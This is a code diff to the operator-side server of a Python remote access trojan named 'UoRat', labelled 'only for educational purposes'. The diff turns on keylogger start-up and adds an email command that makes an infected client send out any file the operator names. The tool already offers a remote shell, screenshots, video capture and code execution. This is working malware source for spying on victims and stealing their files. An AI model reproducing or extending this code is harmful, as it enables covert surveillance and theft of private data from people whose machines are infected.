@@ -2,8 +2,8 @@
 +-----------------------------------------------------------------------+
 |                               UoRat                                   |
 |    Author: 27016005                                                   |
-|    Version: 0.3.0                                                     |
-|    Last update: 08-04-2021 (dd-mm-yyyy)                               |
+|    Version: 0.5.0                                                     |
+|    Last update: 14-04-2021 (dd-mm-yyyy)                               |
 |                                                                       |
 |                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
 +-----------------------------------------------------------------------+
@@ -57,7 +57,8 @@ class Server:
             "-exe": self.exePy,
             "-ss": self.screenshot,
             "-vid": self.vidByFrames,
-            "-shell": self.cmdctrl
+            "-shell": self.cmdctrl,
+            "-email": self.email
         }
 
     def startServer(self):
@@ -236,7 +237,10 @@ class Server:
 
 # ''' KEYLOGGER FUNCTIONS '''
     def startKeyLogger(self):
-        pass
+        command = "-KLstart"
+        self.client_socket.send(command.encode("utf-8"))
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+        print(response)
 
     def stopKeylogger(self):
         command = "-KLend"
@@ -423,6 +427,17 @@ class Server:
             data = to_send.read()
             self.client_socket.send(data)
         print("*** File sent ***")
+
+    def email(self):
+        command = "-email"
+        self.client_socket.send(command.encode())
+        path = input("[+] Enter the file path of the designated file to have emailed: ")
+        self.client_socket.send(path.encode("utf-8"))
+        response = self.client_socket.recv(self.BUFFER_SIZE).decode()
+        print(response)
+
+
+
 # ''' MISC '''
 
     def getTargetInfo(self):
